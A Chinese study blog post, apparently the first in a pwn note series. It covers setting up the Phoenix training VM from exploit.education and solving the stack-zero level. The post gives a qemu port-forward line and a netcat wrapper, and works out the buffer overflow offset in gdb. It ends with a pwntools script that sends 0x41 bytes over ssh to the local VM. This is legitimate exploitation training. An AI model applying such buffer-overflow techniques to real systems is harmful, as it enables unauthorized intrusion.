---
title: "[pwn笔记0]Phoenix环境搭建和stack-zero"
urlname: "[pwn笔记0]Phoenix环境搭建和stack-zero"

date: February 15, 2023 6:13 PM
tags: [pwn, stack]
---
找到一个学习pwn的项目[http://exploit.education](http://exploit.education/) ，决定让我临时抱佛脚学的pwn走向正轨，试试开个笔记系列（每次pwntools脚本都忘记怎么写），希望不要半路弃坑。定个小目标，至少把Phoenix系列做完吧。

## 环境配置

首先在more-downloads里下载phoenix的虚拟机系统镜像，根据你的架构选择。这就是靶机。在启动之前，我们需要安装`qemu-system-x86` （64位的也在同一个包里（archlinux））

运行`boot-balabala.sh`启动虚拟机，默认在2222端口开启ssh。用户名和密码都是user。

如果你想使用netcat来转发里面的程序，只需在启动脚本里添加另一个端口转发，这里放网络那一整行为例。

```bash
-netdev user,id=unet,hostfwd=tcp:127.0.0.1:2222-:22,hostfwd=tcp:127.0.0.1:3333-:3333
```

然后在虚拟机里执行

```bash
mkfifo io
```

并创建一个脚本文件（start.sh）

```bash
#!/bin/bash
cat io|$1 -i 2>&1|nc -l 3333 > io
```

然后你就可以通过`sh start.sh /opt/phoenix/amd64/stack-zero` 这样的方式来开netcat了，端口3333记得要和启动脚本里的匹配。

虚拟机里的gdb默认装了gef但是我不太会用，所以scp了一份peda进去。略过。

宿主机再装个非常方便的pwntools：`pip install pwntools`

## stack-zero

程序比较简单，直接用cutter了。

![深度截图_选择区域_20230215183930.png](%5Bpwn%E7%AC%94%E8%AE%B00%5DPhoenix%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8Cstack-zero%20366826c7bb10483aa08121888111f984/%25E6%25B7%25B1%25E5%25BA%25A6%25E6%2588%25AA%25E5%259B%25BE_%25E9%2580%2589%25E6%258B%25A9%25E5%258C%25BA%25E5%259F%259F_20230215183930.png)

（其实exploit.education的网页上给了源码）（开头的注释甚至是个冷笑话草草草）

我们现在要让s溢出到var_10h(changeme)，内容随便。打开gdb，计算一下距离，先随便输入点什么。

![Untitled](%5Bpwn%E7%AC%94%E8%AE%B00%5DPhoenix%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8Cstack-zero%20366826c7bb10483aa08121888111f984/Untitled.png)

字符串在`0x620`这里。

![Untitled](%5Bpwn%E7%AC%94%E8%AE%B00%5DPhoenix%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8Cstack-zero%20366826c7bb10483aa08121888111f984/Untitled%201.png)

判断语句，changeme在`rbp-0x10` 这里也就是`0x670-0x10` 

计算`0x660-0x620=0x40`

那么我们只要输出`0x41`个a即可

为了练习使用pwntools，写个代码。

这里直接用ssh连了，nc都不需要。

```python
from pwn import *

shell = ssh("user", "localhost", password="user", port=2222)
sh = shell.run("/opt/phoenix/amd64/stack-zero")
print(sh.recvline())
sh.sendline(b"a"*0x41)
print(sh.recvline())
shell.close()
```

成功

![Untitled](%5Bpwn%E7%AC%94%E8%AE%B00%5DPhoenix%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8Cstack-zero%20366826c7bb10483aa08121888111f984/Untitled%202.png)
